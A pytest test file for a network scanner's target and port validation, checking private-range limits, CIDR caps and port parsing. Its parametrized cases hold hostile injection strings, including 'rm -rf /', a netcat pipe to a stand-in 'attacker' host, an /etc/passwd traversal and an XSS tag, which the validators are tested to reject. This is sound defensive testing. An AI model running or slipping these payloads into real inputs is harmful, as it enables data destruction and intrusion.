from __future__ import annotations

import pytest

from app.config import settings
from app.core.targets import (
    QUICK_PORTS,
    STANDARD_PORTS,
    TargetValidationError,
    parse_ports,
    parse_target,
    parse_udp_ports,
)


class TestParseTarget:
    def test_single_private_ip(self) -> None:
        result = parse_target("192.168.1.10")
        assert result.kind == "ip"
        assert result.addresses == ["192.168.1.10"]

    def test_loopback_allowed(self) -> None:
        assert parse_target("127.0.0.1").addresses == ["127.0.0.1"]

    def test_cidr_expands_to_usable_hosts(self) -> None:
        result = parse_target("192.168.1.0/30")
        assert result.kind == "cidr"
        assert result.addresses == ["192.168.1.1", "192.168.1.2"]

    def test_cidr_31_falls_back_to_network_address(self) -> None:
        # /31 has no "usable hosts" under the classic rule; we still scan it.
        assert len(parse_target("10.0.0.0/31").addresses) == 2

    def test_public_target_blocked_by_default(self) -> None:
        assert settings.allow_public_targets is False
        with pytest.raises(TargetValidationError, match="public address"):
            parse_target("8.8.8.8")

    def test_oversized_cidr_rejected(self) -> None:
        with pytest.raises(TargetValidationError, match="above the limit"):
            parse_target("10.0.0.0/8")

    def test_empty_rejected(self) -> None:
        with pytest.raises(TargetValidationError):
            parse_target("   ")

    def test_ipv6_rejected(self) -> None:
        with pytest.raises(TargetValidationError, match="IPv4"):
            parse_target("::1")

    @pytest.mark.parametrize(
        "hostile",
        [
            "127.0.0.1; rm -rf /",
            "127.0.0.1 && whoami",
            "$(whoami)",
            "`id`",
            "host name",
            "10.0.0.1|nc attacker 4444",
            "../../etc/passwd",
            "<script>alert(1)</script>",
        ],
    )
    def test_shell_metacharacters_rejected(self, hostile: str) -> None:
        """Nothing shell-like survives parsing, so nothing can reach a subprocess."""
        with pytest.raises(TargetValidationError):
            parse_target(hostile)

    def test_unresolvable_hostname_rejected(self) -> None:
        with pytest.raises(TargetValidationError, match="could not be resolved"):
            parse_target("nonexistent-host-for-tests.invalid")


class TestParsePorts:
    def test_default_quick_profile(self) -> None:
        assert parse_ports(None) == sorted(QUICK_PORTS)

    def test_standard_profile(self) -> None:
        assert parse_ports(None, profile="standard") == sorted(STANDARD_PORTS)

    def test_custom_profile_requires_ports(self) -> None:
        with pytest.raises(TargetValidationError, match="explicit port specification"):
            parse_ports(None, profile="custom")

    def test_comma_list(self) -> None:
        assert parse_ports("22,80,443") == [22, 80, 443]

    def test_range(self) -> None:
        assert parse_ports("20-25") == [20, 21, 22, 23, 24, 25]

    def test_mixed_and_deduplicated(self) -> None:
        assert parse_ports("80,20-22,80") == [20, 21, 22, 80]

    def test_reversed_range_is_normalised(self) -> None:
        assert parse_ports("25-20") == [20, 21, 22, 23, 24, 25]

    @pytest.mark.parametrize("bad", ["0", "65536", "-1", "99999"])
    def test_out_of_range_rejected(self, bad: str) -> None:
        with pytest.raises(TargetValidationError):
            parse_ports(bad)

    @pytest.mark.parametrize("bad", ["22; ls", "80 | nc", "http", "22,,;", "$(id)"])
    def test_non_numeric_rejected(self, bad: str) -> None:
        with pytest.raises(TargetValidationError):
            parse_ports(bad)

    def test_huge_range_rejected(self) -> None:
        with pytest.raises(TargetValidationError):
            parse_ports("1-65535")


class TestUdpPorts:
    def test_defaults_to_small_common_set(self) -> None:
        assert parse_udp_ports(None) == [53, 67, 68, 123, 161, 500, 1900]

    def test_caps_the_count(self) -> None:
        with pytest.raises(TargetValidationError, match="conservative"):
            parse_udp_ports("1-200")
